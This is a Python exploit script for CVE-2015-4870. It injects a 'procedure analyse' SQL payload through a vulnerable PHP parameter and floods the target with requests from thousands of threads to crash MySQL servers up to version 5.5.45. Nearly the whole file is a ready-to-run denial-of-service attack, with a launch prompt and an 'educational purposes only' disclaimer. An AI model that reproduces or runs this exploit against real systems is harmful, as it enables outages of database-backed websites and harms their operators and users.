#!/usr/bin/env python

# Title: MySQL Procedure Analyse DoS Exploit
# Author: Osanda Malith Jayathissa (@OsandaMalith)
# E-Mail: osanda[cat]unseen.is
# Version: Vulnerable upto MySQL 5.5.45
# Original Write-up: https://osandamalith.wordpress.com/2016/05/29/mysql-dos-in-the-procedure-analyse-function-cve-2015-4870/
# This exploit is compatible with both Python 3.x and 2.x
# CVE: CVE-2015-4870

from __future__ import print_function
import threading
import time
import sys
import os

try: 
	import urllib.request as urllib2
	import urllib.parse as urllib

except ImportError:
	import urllib2
	import urllib

try: input = raw_input
except NameError: pass

host = "http://host/xxx.php?id=1'"

payload = " procedure analyse((select*from(select 1)x),1)-- -"

payload = urllib.quote(payload)
url = host + payload
req = urllib2.Request(url)
req.add_header('Accept', '*/*')
req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
#req.add_header('Cookie', 'security=low; PHPSESSID=uegfnidhcdicvlsrc0uesio455')
req.add_header('Connection', '')
req.add_header('Content-type', 'text/xml')
cls = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')

class DoS(threading.Thread):
	def run(self):
		print("{0} started!".format(self.getName()))
		for i in range(100):  
			urllib2.urlopen(req)

		time.sleep(.2)                                      
		print("{0} finished!".format(self.getName()))            

def banner():
	print ('''                                                       
                  ____    _____   __        
 /'\\_/`\\         /\\  _`\\ /\\  __`\\/\\ \\       
/\\      \\  __  __\\ \\,\\L\\_\\ \\ \\/\\ \\ \\ \\      
\\ \\ \\__\\ \\/\\ \\/\\ \\\\/_\\__ \\\\ \\ \\ \\ \\ \\ \\  __ 
 \\ \\ \\_/\\ \\ \\ \\_\\ \\ /\\ \\L\\ \\ \\ \\\\'\\\\ \\ \\L\\ \\
  \\ \\_\\\\ \\_\\/`____ \\\\ `\\____\\ \\___\\_\\ \\____/
   \\/_/ \\/_/`/___/> \\\\/_____/\\/__//_/\\/___/ 
               /\\___/                       
               \\/__/                                                    
		 ____            ____       
		/\\  _`\\         /\\  _`\\     
		\\ \\ \\/\\ \\    ___\\ \\,\\L\\_\\   
		 \\ \\ \\ \\ \\  / __`\\/_\\__ \\   
		  \\ \\ \\_\\ \\/\\ \\L\\ \\/\\ \\L\\ \\ 
		   \\ \\____/\\ \\____/\\ `\\____\\
		    \\/___/  \\/___/  \\/_____/
                            
[*] Author: Osanda Malith Jayathissa (@OsandaMalith)
[*] E-Mail: osanda[cat]unseen.is
[*] Website: http://osandamalith.wordpress.com  
[!] Author takes no responsibility of any damage you cause
[!] Strictly for Educational purposes only 
''')
	print("[*] Host: {0}".format(host))
	input("\n\t[-] Press Return to launch the attack\n")

def _start():
	try:
		cls()
		banner()
		for i in range(10000):                                      
			thread = DoS(name = "[+] Thread-{0}".format(i + 1))   
			thread.start()                                  
			time.sleep(.1)

	except KeyboardInterrupt:
		print ('\n[!] Ctrl + C detected\n[!] Exiting')
		sys.exit(0)
		
	except EOFError:
		print ('\n[!] Ctrl + D detected\n[!] Exiting')
		sys.exit(0)

if __name__ == '__main__':
	_start()